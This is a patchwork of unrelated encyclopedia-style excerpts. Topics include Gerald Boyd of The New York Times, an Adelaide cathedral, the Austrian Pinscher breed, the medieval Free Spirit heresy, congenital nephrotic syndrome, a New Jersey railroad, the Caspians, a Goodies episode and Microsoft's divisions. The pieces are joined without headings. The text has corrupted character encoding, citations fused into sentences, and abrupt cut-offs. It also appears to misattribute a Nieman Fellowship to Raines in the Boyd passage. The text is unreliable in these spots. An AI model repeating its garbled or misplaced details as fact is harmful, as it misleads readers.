He was the first African-American metropolitan editor and managing editor at The New York Times, after joining the newspaper in 1983 in its Washington, D.C. bureau. A controversy in 2003 about the reporting of Jayson Blair forced both Boyd and the Executive Editor, Howell Raines, to resign that year. Boyd had started his journalism career in 1973 at the St. Louis Post-Dispatch, in his hometown city, after graduating from the University of Missouri. In 1977 he and a colleague, George Curry, founded the Greater St. Louis Association of Black Journalists. In addition, they established a program to train black high school students in the business. Raines received a Nieman Fellowship in 1979. Biography Born in St. Louis, Missouri, Boyd had an older brother and younger sister. After their mother's death at a young age from sickle cell anemia, their father left the family and they were raised by their paternal grandmother. He attended local schools, including Soldan High School. There he worked on the high school newspaper and after school at a grocery store to earn money for the family. He won a full scholarship to the University of Missouri sponsored by the St. Louis Post- Dispatch, which also guaranteed him a job after graduation. He joined the newspaper in 1973. Together with colleague, George Curry, in 1977 the two reporters founded the Greater St. Louis Association of Black Journalists. In addition, they established a program to train black high school students in the business.Barringer, Felicity (November 24, 2006), \\"Gerald M.

It is classified as being a Gothic Revival building in the Early English style. The tower stands 36 m high and is 56.5 m lengthwise and 29.5 m horizontally. The foundation stone was laid in 1856 and the building was opened in 1858. The construction of the tower began in 1887. However, it was not completed until 1996. History In 1838, two years after the proclamation of South Australia, an advertisement was put up to organise religious meetings for South Australian Catholics. The first Mass was celebrated in a house on East Terrace in 1840. In 1845, a Catholic primary school was set up and used as the religious centre for Catholics until the foundation stone for a cathedral was laid in 1851 for a design by Richard Lambeth. However, with a gold rush in Victoria, Lambeth left along with many of the population, leaving no plans and with the community in economic depression. The original foundation stone was put in place on 17 March 1856 by the vicar general, Father Michael Ryan, with the first part of the cathedral being dedicated on 11 July 1858. It was first extended when construction began at the southern end of the cathedral, including the sanctuary, side chapel, lady chapel and sacristy in January 1859. Construction of the first extension finished the following year in November 1860. With further growth in the population of Adelaide, another extension was required to seat more worshippers. In November 1886, Bishop Reynolds laid the foundation stone for an extension on the eastern side for a further 200 people, as well new vestries and confessionals. These were completed in August the following year. In 1904, electric lighting was introduced. The cathedral was expanded again in 1923, with extensions to the western aisle and northern end of the bell tower, and was opened in April 1926 by Archbishop Spence. The cornerstone of the current bell tower was laid in 1887, and although the lower part was built between 1923 and 1926 it was not completed until 1996 by the architect Lynton Jury, 109 years after construction of the tower commenced. The bell used in the tower is the Murphy Bell of 1867, surrounded by thirteen other bells hung for change ringing, installed in 1996, seven of these bells date from 1881 and were previously in St Mary's Cathedral, Sydney. The bells are rung by members of The Australian and New Zealand Association of Bellringers. The cathedral suffered significant damage in the 1954 Adelaide earthquake.60 Years On - Adelaide Earthquake Australian Earthquake Engineering Society Retrieved 15 March 2016.  Features  Located at the north-western corner is a statue of St John the Baptist, which was carved in Tuscany in 1925 and features a picture of the baptism of Jesus. The lady chapel altar, located at the south- west, is made from Carrara marble with inset panels of simulated lapis lazuli (although many texts erroneously describe it as real) and was dedicated in 1954. Bronze statues of Joseph and Jesus and the flight into Egypt are also depicted on the western side of the cathedral. At the front of the cathedral, the southern end, are lancet windows featuring images of St Patrick and St Lawrence, as well depictions of the life of Mary and Jesus. The eastern side of the cathedral features a statue of St Patrick, the patron of the Archdiocese of Adelaide, with Celtic symbols prevalent in the surroundings. The cathedral has had three organs throughout its history. The first was put in place in 1869 by Johann Wolff, with two pedals and one manual. It was replaced in 1926 by J. E. Dodd with two manuals, which was subsequently rebuilt in 1954.  Services  The cathedral is open daily from early morning until evening, with Mass celebrated three times daily. The cathedral also maintains a choir.

The name originally given to the breed in 1928 was the √ñsterreichischer Kurzhaarpinscher (Austrian Shorthaired Pinscher) to differentiate it from similarly named breeds, but today in its country of origin the breed is officially called the √ñsterreichischer Pinscher, or Austrian Pinscher in English. Appearance Like other farm dogs raised for work rather than for pets or show, the appearance can vary a great deal, although there is a definite breed standard.The Look Austrian Pinscher Club (in German) In general, the Austrian Pinscher is a normally proportioned strong and sturdy dog, 33 ‚Äì 48 cm (13 - 19 inches) at the withers. The breed has button ears and a head described as being shaped like a pear. The double coat is short to medium long, in a variety of yellow, red or black and tan colours, usually with white markings on the face, chest, feet and tip of the tail. The long tail is held high, and dogs of this breed should look lively and alert.Breed Standard They are heavier, more rugged and rectangular in appearance than the German Pinscher.  History  The Austrian Shorthaired Pinscher was recognised as a breed for the first time in 1928, but the breed was developed from an old type of pinscher found on farms in the Austrian countryside, a mixture of German Pinschers and the local dogs. At the end of the 19th century, the farm dogs began to die out when the work they did was no longer needed.Situation Today from the Austrian Pinscher Club (Klub f√ºr √∂sterreichische Pinscher) in Austria (in German) In the early 20th century Emil Hauck, looking for an aboriginal dog type identified in 1843 by H. von Meyer as Canis palustris or dog of the marshesThe History of the Geological Society of London, by Horace Bolingbroke Woodward, pg 79 Longmans, Green and Co publishers, New York, 1908 Note: the C. palustris idea came from the early days of scientific thinking about animals, and is not and has never been an actual species. All dogs are Canis lupus familiaris. (a type of dog, not an actual species), found what he believed were some examples of similar dogs in the Austrian countryside.Breed History In 1921 he began serious breeding to revive and define the type of the breed, to separate them from other landrace pinschers of the area. The Austrian Kennel Club (√ñsterreicher Kynologenverband) first recognised the breed as the √ñsterreichischer Kurzhaarpinscher (translates in English as Austrian Shorthaired Pinscher) in 1928. The name was given to the breed to identify its place of origin as Austria (√ñsterreich), and to differentiate it from the Schnauzer which at that time was called the Rough-haired Pinscher (rauhaariger Pinscher). After World War II, though, the breed almost vanished. In the 1970s only one registered dog of the breed remained, named Diokles of Angern. Breeding this dog with other dogs identified as of the old pinscher type in the area (\\"Landpinschern\\") has brought the breed back, although there are still only a small number of them. Ark Austria (Arche Austria), an association for the preservation of endangered indigenous breeds, lists the Austrian Pinscher and states that it is highly vulnerable, with only 6 to 12 breeding animals, who are being carefully bred to preserve health and breed type.√ñsterreichischer Pinscher, Arche Austria (in German) The breed is recognised in its country of origin by the √ñsterreischer Kynologenverband (√ñKV, Austrian Kennel Club) and internationally by the F√©d√©ration Cynologique Internationale in the Pinscher section of Group 2. It is also recognised by the United Kennel Club in the United States as the Austrian Pinscher as of 2006, in the Terrier Group, for its background as a rat hunter. In addition it is recognised by a number of minor kennel clubs and internet based dog registry businesses under a variety of translations of the name, who may rewrite the standard to suit producers of dogs for the rare breed pet market. Purchasers of puppies and dogs from groups outside the Austrian breed restoration program should read the original standard (obtainable in translation from the FCI) and their dog's pedigree to make sure they are buying an Austrian Pinscher and not an excessively inbred or a random-bred dog.  Health  No data have been collected on the breed's health, but good health is a stated objective of the breed restoration breeding in Austria. Temperament  The breed is described as \\"a pleasant companion\\" for rural and suburban areas. The breed standard describes the ideal Austrian Pinscher's temperament and character as playful, not inclined to be a hunter, and being an \\"incorruptible guard\\".

The movement was first identified in the late thirteenth century. It was not a single movement or school of thought, and it caused great unease among Church leaders at the time. Adherents were also called Free Spirits. The set of errors condemned in the bull Ad nostrum at the Council of Vienne (1311‚Äì12) has often been used by historians to typify the core beliefs, though there was great variation during the period over how the heresy was defined, and there is great debate over how far the individuals and groups accused of holding the beliefs (including Marguerite Porete, beguines, beghards, and Meister Eckhart) actually held the views attributed to them.Both Robert E. Lerner, The Heresy of the Free Spirit in the Late Middle Ages, (Berkeley, CA: University of California Press, 1972) and Malcolm Lambert, Medieval Heresy, 2nd edn, (Oxford: Blackwell, 1992) agree that the so-called \\"heresy of the free spirit\\" never actually existed, even in the early fourteenth century, at least not in the form of specific doctrines promoted by any organised body, still less by any sect and least of all by the Beguines or Beghards. The meaning of the term has in more recent times been extended to apply to the beliefs of other Christian individuals and groups, active both before and after the core period of the late Middle Ages. Origins The set of beliefs ascribed to the Free Spirits is first to be found in a text called the Compilatio de novo spiritu put together by Albert the Great in the 1270s, concerning a group of persons investigated in the Swabian Ries area of Germany.Bernard McGinn, The Harvest of Mysticism in Medieval Germany, (New York: Crossroad, 2005), p63. The themes which occur in these documents, and which would emerge again in subsequent investigations, included: *Autotheism ‚Äì in other words, a belief that the perfected soul and God are indistinguishably one. This was often expressed through the language of indistinction or annihilation. This belief would be heretical because it would undermine the necessary distinction between fallen created being and creator. * Denial of the necessity of Christ, the church and its sacraments for salvation ‚Äì such that austerity and reliance on the Holy Spirit was believed to be sufficient for salvation. They believed that they could communicate directly with God and did not need the Catholic Church for intercession. * Use of the language of erotic union with Christ. * Antinomian statements (\\"Nothing is a sin except what is thought to be a sin\\"). Critics of the Free Spirit interpreted their beliefs to mean that they considered themselves to be incapable of sin and above the moral conduct of the Church.Michael D. Bailey. Battling Demons: Witchcraft, Heresy, and Reform in the Late Middle Ages. Pennsylvania State University Press, 2003, p. 56. Verses such as Galatians 5:18 (\\"Those who are driven or led by the Spirit of God are no longer under the law\\") were seen as foundational to such beliefs. * Anticlerical sentiment. During the late thirteenth century, such concerns increasingly became applied to the various unregulated religious groups such as beguines and beghards, who had greatly increased in number in the preceding decades. Concerns over such sentiments then began to occur elsewhere, especially during the 1300s, and especially in Italy. Partly motivated by such concerns, in 1308 Pope Clement V summoned a general council, which met at Vienne from October 1311 to May 1312. In particular, it had to engage with the report from the Paris inquisition (1308‚Äì1310) into the beguine Marguerite Porete‚Äôs The Mirror of Simple Souls (Porete‚Äôs writing, which had become well read through France, had been condemned in 1310 as heresy, and Porete had been burned at the stake) .Richard Kieckhefer. Repression of Heresy in Medieval Germany. University of Pennsylvania Press, 1979, pp. 38‚Äì39.Bernard McGinn. The Harvest of Mysticism in Medieval Germany. New York: Crossroad, 2005, p. 65. It was the Council of Vienne which first associated these various beliefs with the idea of the 'Free Spirit'.Bernard McGinn. The Harvest of Mysticism in Medieval Germany. New York: Crossroad, 2005, p. 65. Fourteenth and fifteenth century During subsequent centuries, there was great fear of the Heresy of the Free Spirit, and many individuals and groups were accused of it. In particular, beguine and beghard groups came under suspicion. John of Dirpheim, Bishop of Strasbourg from 1306 to 1328, was a particularly fervent opponent of heresy.Bernard McGinn. The Harvest of Mysticism in Medieval Germany. New York: Crossroad, 2005, p. 65. Another person accused, by Bishop John's colleague Henry of Virneburg, Bishop of Cologne, was Meister Eckhart, a German Dominican, who lived during the late thirteenth and early fourteenth centuries. In 1326, Eckhart was charged by the Pope for teaching heresy. He rigorously denied and defended against that charge until he disappeared from public life. Eckhart may have been familiar with the work of Marguerite Porete through his proximity to theologians involved in her trial, such as Berengar of Landora and William of Poitiers. More broadly, as a result of his prominence and through the statements of his used in the bull In agro Dominico he came to be recognised by the later mystical tradition as the \\"father\\" of the Free Spirit. This is seen particularly in the writings of Jan van Ruusbroec and his followers.Robert E. Lerner. The Heresy of the Free Spirit in the Late Middle Ages. Berkeley, California: University of California Press, 1972, intro.Edmund Colledge and J. C. Marler. Poverty of the Will': Ruusbroec, Eckhart and 'The Mirror of Simple Souls. In Jan Van Ruusbroec: The Sources, Content and Sequels of his Mysticism, ed. P. Mommaers and N. De Paepe (Leuven: Leuven University Press, 1984), esp. pp. 15‚Äì16. During the late fourteenth century, western Germany became a particularly important area for pursuing the heresy. An example of one person executed is the wandering preacher Nicholas of Basel, who was executed sometime between 1393 and 1397.Bernard McGinn. The Harvest of Mysticism in Medieval Germany. New York: Crossroad, 2005, p. 69. Another known case was the execution of L√∂ffler, who admitted adherence to the movement, in Bern.Henry Frank Eshleman (1917).

False beliefs about the annihilation of the will were virulently attacked by the late fourteenth century Theologia Deutsch.Bernard McGinn. The Harvest of Mysticism in Medieval Germany. New York: Crossroad, 2005, p. 402. In the early fifteenth century, Jean Gerson accused Jan van Ruusbroec of misdescribing the nature of union with God in a way that placed him in the company of the 'Free Spirit' heretics.Denys Turner. \\"Dionysius and some late medieval mystical theologians of northern Europe\\". Modern Theology 24:4, 2008, p. 654. By the early fifteenth century, the Catholic Church in Germany viewed heresy as a serious threat. It became a leading topic for discussion at the Council of Basel in 1431. Johannes Nider, a Dominican reformer who attended the council, became concerned that beliefs of the Free Spirit heresy, and other heresies, were mixed with elements of witchcraft. In his 1434 work, Formicarius, Nider combined the Free Spirit heresy with witchcraft in his condemnation of false teachings. Formicarius also became a model for Malleus maleficarum, a later work by Heinrich Kramer in 1486.Bailey, Battling Demons, 49. By the late fourteenth and early fifteenth centuries, the Church's efforts to eradicate heresy and witchcraft resulted in heresy trials and the parallel civil authorities conducting witch burnings. Similarities to other Christian beliefs Fears over sets of beliefs similar to the Heresy of the Free Spirit have recurred at various points in Christian history. Fears over esotericism and antinomianism, such as were detected in the Heresy of the Free Spirit, may be detected in the early Church's response to Gnosticism. Fears of suspect forms of prayer were particularly apparent in reactions to the fourth and fifth century Messalianism. What was perhaps novel in the fears of the Heresy of the Free Spirit was the fear of the notion of personal annihilation. This was a new idea to the mystical tradition, but was also seen as the root of many of the other dangers that were perceived in mystics in the late medieval period.Bernard McGinn. The Harvest of Mysticism in Medieval Germany. New York: Crossroad, 2005, p. 55. Similarities may also be detected with seventeenth- century quietism.

The Company, founded in 1976 by Luciano Bonaria, today employs about 600 people, distributed among the Italian headquarters in Volpiano (Turin) and the subsidiaries located in USA, Germany, China, Korea and Singapore. The main application fields for SPEA's equipment are the following: * EMS * Industry * Consumer * Automotive * Telecommunications * Aerospace * Defence In all these fields, SPEA's equipment are used to perform electrical and functional production tests on the electronic devices before they are shipped to the customer, so to ensure the products are defect-free and will work correctly through time.  ATE for Electronics Industry  Testers for electronic boards are divided into: * \\"Bed of nails\\" testers are used for testing PCBAs in mass production, where the low cost of test and the near zero field return rate are the key industry needs. This type of tester can execute several test techniques - such as In-circuit test, Boundary Scan, AOI, Functional Test, LED light test, built-in self-test so to provide a complete test of the PCBAs before the end-of-line test. * Flying probe testers are often used for testing Low to Mid volume production, NPI, prototypes and boards that present accessibility problems (so, components cannot be contacted by using a bed-of- nails test system). Linear motors and linear optical encoders on each moving axis make them suitable to probe points on PLCCs, SOICs, PGAs, SSOPs, QFPs and others, without fixturing or complex programming required. The high speed of the latest flying probe models makes them suitable also for high volume production. ATE and Automation for Semiconductor Industry The range of SPEA semiconductor equipment includes: * Integrated test cells for MEMS and sensors, combining pick&place; handling, DUT contacting and complete final test capabilities, including electrical test, physical stimulus for functional test and calibration, and tri-temp thermal conditioning * Mixed Signal semiconductor tester platform * Power module test cells * Smart card module test cells * Smart card modules, UHF &RFID; tester * Reel to Reel device handlers * Pick and Place test handlers Milestones 1976: Luciano Bonaria, researcher and designer of electronic testing equipment at General Electric, decides to go on his own and founded SPEA, systems for electronics and automation.

This disease is primarily caused by genetic mutations which result in damage to components of the glomerular filtration barrier and allow for leakage of plasma proteins into the urinary space. Signs and symptoms Urine protein loss leads to total body swelling (generalized edema) and abdominal distension in the first several weeks to months of life. Fluid retention may lead to cough (from pulmonary edema), ascities, and widened cranial sutures and fontanelles. High urine protein loss can lead to foamy appearance of urine. Infants may be born prematurely with low birth weight, and have meconium stained amniotic fluid or a large placenta.  Complications  * Frequent, severe infections: urinary loss of immunoglobulins * Malnutrition and poor growth * Blood clots (hypercoagulability): imbalance of plasma coagulation factors from urine protein loss *Hypothyroidism: urinary loss of thyroid-binding protein *Poor bone health associated with vitamin D deficiency: urinary loss of vitamin D binding protein * Acute kidney injury *Chronic kidney disease and ultimately end-stage kidney disease Causes  Primary (genetic) causes  Mutations in the following five genes account for greater than 80% of the genetic causes of congenital nephrotic syndrome: * NPHS1 (Finnish Type): The gene NPHS1 encodes for the protein nephrin. This genetic variant is characterized by severe protein loss in the first several days to weeks of life. Fin-major and Fin-minor were the first two main genetic mutations identified in Finnish newborns, however, numerous mutations have now been identified in patients all over the world from various ethnic groups. NPHS1 mutations are the most common cause of primary congenital nephrotic syndrome, accounting for 40-80% of cases. * NPHS2: This gene encodes for the protein podocin. Patients with this genetic mutation develop nephrotic syndrome in the first few weeks of infancy, but can also manifest symptoms later in life. Urinary protein loss is less severe when compared with the Finnish type. Both nephrin and podocin play important roles in the structure and function of the podocyte filtration slit diaphragm and disease involvement is typically limited to the kidneys * WT1: The Wilms' tumor suppressor gene regulates the expression of many genes involved in kidney and urogenital development. Mutations lead to several types of developmental syndromes, including Denys-Drash syndrome, Frasier syndrome, WAGR syndrome (Wilms tumor, aniridia, genitourinary abnormalities, and mental retardation), and isolated nephrotic syndrome in infants. Depending on the specific syndrome, patients are at risk for Wilms' and other tumors, genital abnormalities, and nephrotic syndrome. * LAMŒ≤2 (Pierson syndrome): This gene encodes for the protein laminin Œ≤2, which helps attach podocytes to the glomerular basement membrane. Patients with Pierson syndrome have eye abnormalities, including nonreactive narrowing of the pupils (microcoria), and neurologic deficits. * PLCŒµ1: Codes for the enzyme Phospholipase CŒµ1, which is expressed in podocytes.  Secondary Causes  *Congenital infections: syphilis, cytomegalovirus, toxoplasmosis, rubella, human immunodeficiency virus (HIV), malaria, hepatitis B * Immunologic: maternal systemic lupus erythematosus Diagnosis An examination reveals massive fluid retention and generalized swelling. Abnormal sounds are heard when listening to the heart and lungs with a stethoscope. Blood pressure may be high. The patient may have signs of malnutrition. A urinalysis reveals large amounts of protein and sometimes small amounts of blood in the urine. Kidney function may be normal in the first weeks or months of life. Laboratory studies show low serum levels of protein (albumin) and immunoglobulins, and elevated levels of triglycerides and cholesterol. Blood work may also show thyroid and vitamin D deficiency. Kidneys on ultrasound imaging may appear enlarged and brighter (hyperechoic). The disorder can be screened during pregnancy by finding elevated levels of alpha-fetoprotein on a routine sampling of amniotic fluid. Indication for kidney biopsy remains unclear as histologic findings do no reveal the cause of congenital nephrotic syndrome, but findings may help in developing treatment strategies. Findings on light microscopy can vary from minimal change nephropathy to focal segmental glomerulosclerosis or diffuse mesanigial sclerosis. Electron microscopy shows podocyte disruption (loss of foot processes or slit diaphragm). Genetic analysis and infectious workup are needed to determine the precise cause of congenital nephrotic syndrome. Understanding the underlying cause can assist in disease management, prognosis, and genetic counseling. Treatment Genetic forms of nephrotic syndrome are typically resistant to steroid and other immunosuppressive treatment. Goals of therapy are to control urinary protein loss and swelling, provide good nutrition to allow the child to grow, and prevent complications. Early and aggressive treatment is required to control the disorder. Patients with severe urine protein loss require albumin infusions help replace protein loss and diuretic medications help rid the body of excess fluid. For patients with mild to moderate urine protein losses, ACE inhibitor medications (like Captopril and others) and non-steroidal anti-inflammatory drugs (like indomethacin) are used to slow the spilling of protein (albumin) in the urine. Removal of the kidneys (one at the time or both) can decrease protein loss and limit the number of albumin infusions needed. Infants with WT1 mutations will undergo bilateral kidney removal to prevent development of Wilms' tumor. Antibiotics may be needed to control infections. Immunizations are recommended after kidney removal but prior to transplantation. Patients may also take iron supplements, potassium chloride, thyroxine and other vitamins to replenish what minerals the kidneys have leaked out. Anticoagulants (such as aspirin, dipyridamole, and warfarin) are used to prevent clot formation. Dietary modifications may include the restriction of sodium and use of dietary supplements as appropriate for the nature and extent of malnutrition. Fluids may be restricted to help control swelling. Children with this disease require diets high in calories and protein, and many patients require a feeding tube (nasogastric tube or gastrostomy tube (g-tube)) for medication and/or feeds. Some patients develop oral aversions and will use the tube for all feeds. Other patients eat well and only use the tube for medicine or supplemental feeds. The tube is also useful for patients needing to drink large amounts of fluids around the time of transplant. While infants with infectious causes of congenital nephrotic syndrome may improve with antibiotics or antiviral medications, those with genetic causes progress to end-stage renal disease and require dialysis, and ultimately a kidney transplant. Prognosis Congenital nephrotic syndrome can be successfully controlled with early diagnosis and aggressive treatment including albumin infusions, nephrectomy, and medications. Affected children have rapid decline in kidney function resulting in end-stage renal disease within the first years of life, and require treatment with dialysis and kidney transplantation. Most children live fairly normal life post-transplant but will spend significant time hospitalised pre- transplant and have numerous surgeries to facilitate treatment. Kidney transplantation outcomes for children with congenital nephrotic syndrome are similar to those of other patient groups. Nephrotic syndrome typically does not reoccur following kidney transplantation, however recurrences have been seen in children with NPHS1 mutations who develop anti-nephrin antibodies. Due to the protein (albumin) losses many patients have reduced muscle tone and may experience delays in certain physical milestones such as sitting, crawling and walking. Similarly many patients experience growth delays due to protein loss. Delays vary from mild to significant but most patients experience growth spurts once they receive their transplanted kidney. Physical therapy may be useful for the child to strengthen muscle tone. Children who have a history of stroke from thrombotic complications can have neurologic delays. Undiagnosed cases are often fatal in the first year due to blood clots, infections or other complications.

Its former right-of-way, along with a portion of the Farmingdale and Squan Village Railroad's right-of-way, has become the Edgar Felix Bikeway and the Freehold right-of-way between Route 537 and Big Brook Park in Marlboro has become the Henry Hudson Trail. The section of right of way from Route 537 parallel to Jackson Street and behind the former Karagheusian Rug Mill to the former Central Railroad of New Jersey depot on Jackson Street at Mechanic Street in Freehold Boro has not as of yet been improved to be part of the trail. It is not clear whether this part of the right of way is still owned by New Jersey Transit which owns the rest of the line north into Matawan. The latter has been ‚Äòrailbanked‚Äô which means it can be reactivated (if economic conditions warrant.)  History  The railroad was first chartered on March 12, 1851, and incorporated on March 21, 1851. By the end of 1851, only $40,000 of bonds were subscribed, so the Camden and Amboy Railroad was given authorization to subscribe $100,000 of additional stock to fund the new railroad. Surveying for the line began on September 8, 1851, grading began on October 19, 1852, and the first track was laid on April 4, 1853. The first section of line was opened on July 18, 1853. The establishment of the Freehold & Jamesburg Agricultural Railroad caused Jamesburg to become a railroad hub. The company was formed as a means to haul marl for fertilizer production. The headquarters of the railroad was originally in Jamesburg; later it was moved to Camden. The railroad was reorganized under a special law of New Jersey, on May 21, 1879, when it was incorporated, in which three railroads consolidated to form the Company, including the Farmingdale and Squan Village Railroad, the Freehold Marl Company Railroad (which later became the Monmouth County Agricultural Railroad) and Camden and Amboy Rail Road and Transportation Company. The length of the trackage amounted to . The Allaire family was a major stock holder in the company and James P. Allaire's son, Hal, was on the board of directors. The railroad line was abandoned after 1932. In 1966, the New Jersey Board of Public Utility Commissioners (PUC) approved the sale of a portion of the former railroad's right-of-way to Jersey Central Power & Light Company.

The Caspians (; , Kaspioi; Aramaic: kspy; , Caspiani) were a people of antiquity who dwelt along the southwestern shores of the Caspian Sea, in the region known as Caspiane.\\"A Cyro Caspium mare vocari incipit; accolunt Caspii\\" (Pliny, Natural History vi.13); for a Greek ethnonym of the Aegean Sea, however, see the mythic Aegeus. Caspian is the English version of the Greek ethnonym Kaspioi, mentioned twice by Herodotus among the Achaemenid satrapies of DariusHerodotus, iii.92 (with the Pausicae) and 93 (with the Sacae). and applied by Strabo.Strabo (11.2.15) gives a lost work of Eratosthenes as his source. The name is not attested in Old Iranian.R√ºdiger Schmitt, Caspians, in Encyclopedia Iranica. Accessed on 4 April 2010. The Caspians have generally been regarded as a pre-Indo-European people. They have been identified by Ernst Herzfeld with the Kassites,Herzfeld, The Persian Empire, (Wiesbaden) 1968:195-99, noted by R√ºdiger. who spoke a language not identified with any other known language group and whose origins have long been the subject of debate. However onomastic evidence bearing on this point has been discovered in Aramaic papyri from Egypt published by P. Grelot,Grelot, ‚ÄúNotes d'onomastique sur les textes aram√©ens d'Egypte,‚Äù Semitica 21, 1971, esp. pp. 101-17, noted by R√ºdiger. in which several of the Caspian names that are mentioned‚Äîand identified under the gentilic ◊õ◊°◊§◊ô kaspai‚Äîare in part, etymologically Iranian. The Caspians of the Egyptian papyri must therefore be considered either an Iranian people or strongly under Iranian cultural influence. In the 5th century BC, during the Persian rule in Egypt a regiment (Aramaic degel) of Caspians was stationed in Elephantine, as attested in the Elephantine papyri. They are called kspy in Aramaic and shared their regiment with Khwarezmians, Bactrians and other Iranian peoples. They were not the only garrison on Elephantine. There was also a regiment of Jews.Karel van der Toorn (2016), \\"Ethnicity at Elephantine: Jews, Arameans, Caspians\\", Tel Aviv: Journal of the Institute of Archaeology of Tel Aviv University, 43(2), 147‚Äì164. The Caspians are called Caspiani in Mela's De situ orbis, the Caspi in Pliny's Natural History and the Caspiadae in Valerius Flaccus' Argonautica. In the last work, the Caspians are allies of King Perses of Colchis and appear amongst the Scythian peoples. They are said to have fighting dogs that they take to their graves. This might in fact reflect a variant of the Zoroastrian custom of sky burial, one in which the deceased is left for the dogs to devour.Henri J. W. Wijsman (ed.), Valerius Flaccus, Argonautica, Book VI: A Commentary (Brill, 2000), p. 59. The Caspiadeans reappear in the medieval Historia de via Hierosolymitana among the people arrayed against the forces of the First Crusade (1096‚Äì1099). The anonymous poet, drawing on Flaccus, probably sought to connect the Seljuk Turks, the Crusaders' actual enemy, with the ancient Scythians.Nicholas Morton, Encountering Islam on the First Crusade (Cambridge University Press, 2016), p. 203.

This episode is also known as \\"Punkerella\\" and as \\"Rock Goodies\\". Written by The Goodies, with songs and music by Bill Oddie. Plot The Goodies have become a rock band called \\"The Little Laddies\\", and sing 'Shiny Shoes' and 'on the road', where they are booed and ignored by the general public. However, they are picked up off the street by policemen, who put them to work. Soon tiring of performing for the police, the Goodies discover that punk is the latest fad. Bill and Graeme decide to go punk -- but Tim prefers to keep his neat and tidy image and his shiny shoes. A Punk news announcer says, \\"Right here's the *bleep* news. In the festival of Light Rally, Lord Longford made a *bleep* statement of the moral decline of this *honk honk* country. In support of this, Mary *honk* Whitehouse called for less *cuckoo* and *bleep*. What a pair of *pop*. Mr Tim Brooke *cuckoo* today stated a protest on behalf of the League of Shiny Shoe Wearers.\\" A punk interviewer ('Bill Grumpy') interviews Tim about his niceness, saying: \\"Mr Brooke-Taylor, let's face it, you are nice.\\" to which Tim replied: \\"Yes.\\" The punk interviewer then asked: \\"Would you be nice, here, now?\\" to which Tim replied: \\"Yes, I would.\\" Surprised, the Punk interviewer asked: \\"You mean it honestly wouldn't bother you to be nice in front of millions of people?\\" to which Tim replied: \\"No.\\" The punk interviewer then said: \\"Well, go ahead then.\\" \\"Well,\\" said Tim, \\"it's very, very, very kind of you to have invited me on the programme.\\" The punk interviewer then said with heavy sarcasm: \\"Oh, very clever!\\" Tim said enthusiastically: \\"And I'd like to come on again, please.\\" The punk interviewer, losing patience, says: \\"You sick little *bleep*!\\" and attacks Tim. Tim takes the beautiful Caroline Kook out to dinner, but he can't understand what has happened to the restaurant -- at lunchtime, that day, it had been an ordinary restaurant -- now, at dinnertime, it had changed into a punk restaurant called \\"Trattoria Punk\\". He is so disgusted at what is offered on the restaurant's menu that he can't even say the names out loud (except for ratatouille, which the restaurateur (Graeme) says is off because they've run out of rats). Tim and Caroline finally chooses spaghetti, thinking that this would not be as bad as the rest. However Graeme makes the meal a messy and memorable one for Tim -- memorable, that is, for all the wrong reasons. Tim complains to Caroline Kook about the change to the restaurant, but she starts lecturing him about punk and her job. Caroline has been served with dignity by Graeme, instead of the rough-handed treatment with food which Graeme has metered out to Tim -- so she lacks sympathy for what had happened to Tim. Caroline Kook mentions to Tim that there is to be a Trendsetters Ball. Graeme, who is listening to what she says, looks interested in what he is hearing. People attending the ball try to outdo each other in punkiness, including Bill (who sings a punk song). Tim wants to go to the ball, but he is told that he looks too nice. Upset, Tim sweeps the Goodies office with a broom and asks a mouse for his opinion. The mouse's response upsets Tim even more and he loses his temper, saying, \\"You think I'm the uglist person in the world? Cheeky, bloody mouse!\\" Graeme arrives and turns Tim into Punkerella by operating on him. When Tim awakens, following the operation, he can't see where the change has been made -- until Graeme tells Tim that he has taken Tim's leg off -- following which Tim immediately falls over. Graeme warns Tim that the clip on his leg is not secure and should not be trusted to hold past midnight, so his leg might fall off. Graeme then puts a pumpkin, with rats and lizards hanging from it, over Tim's head, and Tim attends the ball. In his disguise, Tim is an instant success. When he quickly leaves at midnight, during the ball, his amputated leg falls off and Tim leaves it behind on the stairs. And so the hunt is on to find the pumpkin-headed weirdo with one leg -- with Caroline Kook vowing to marry him when he is found. After a lengthy search, and after many imposters who deliberately sawed their legs off, the Coroner arrives at the Goodies place. Graeme is about to reveal the owner of the leg in Tim's favour when Bill bursts in dressed as a one-legged pirate who claims the leg is his. After a pathetic attempt to get the leg on him (and his Parrot), Bill grudgingly calls in Tim to try the leg on. To Bill's amazement, as he had no knowledge Tim's leg was missing, it fits. As promised, Tim wins the hand of Caroline Kook (the left hand and arm to be exact). Graeme wins the top half and the right hand whilst the lower half goes to Bill. And so the Little Laddies live happily ever after.

Starting in April 2002, Microsoft organised itself into seven groups, each an independent financial entity. In September 2005, Microsoft announced a reorganization of its then seven groups into three. In July 2013, Microsoft announced another reorganization into five engineering groups and six corporate affairs groups. A year later, in June 2015, Microsoft reformed into three engineering groups. In September 2016, a new group was created to focus on artificial intelligence and research. On March 29, 2018 a new structure merged all of these into three. As of 2019, these four groups are: * Cloud + AI Group * Experiences + Devices * Artificial Intelligence and Research * Core Services Engineering & Operations  Experiences + Devices  This group produces experiences, from Windows products to devices, to enterprise. Microsoft 365 is the subscription solution that brings it all together.  Windows experience  Windows is an operating system by Microsoft. Windows is available in different families, catering to different kinds of devices. * Windows NT: Windows 10 is the latest OS in this family. It is designed for use in personal computers, 2-in-1 PCs and tablets. As of 2019, Microsoft Windows retained around 85% market share in personal computers and 2-in-1 PCs combined. However, in tablets the market share of Windows is just around 15%. * Windows IoT: It is designed specifically for use in IoT scenarios such as on devices where the OS may not directly be visible to the end user, in particular, home appliances, home automation, auto-motives, industry devices etc. * Windows 10 Mobile, Windows Phone and Windows Mobile: These are designed for smartphones and small tablets. The last OS in this group viz. Windows 10 Mobile includes all basic consumer features, including Continuum capability. These all have been discontinued. * Windows 9x comprises Windows 95, Windows 98 and Windows ME. This family has also been discontinued. * Windows 1.0, Windows 2.0 and Windows 3.0 are versions of Windows that were launched from MS-DOS and were not stand-alone operating systems. This family has also been discontinued. * Xbox One system software includes all versions of Windows running on Xbox game consoles.  Office  Microsoft Office is a line of office software, provided by Microsoft. Office includes Word (a word processor), Excel (a spreadsheet program), PowerPoint (a presentation software), OneNote (a notetaking program), Outlook (an email program, frequently used with Exchange Server), OneDrive (a cloud storage and file hosting service) and Teams (a unified communication and collaboration platform). It also encompasses other products (not bundled in Office suite) like Microsoft Access, Microsoft Publisher, Microsoft Project, Microsoft Visio and Microsoft SharePoint. Web services connected via Microsoft accounts such as Outlook.com (a free web-based service previously branded as Hotmail), Outlook on the web, Sway and To Do are also part of Office.  Skype  Skype is an application that specializes in providing video chat and voice call services. Users can exchange text and 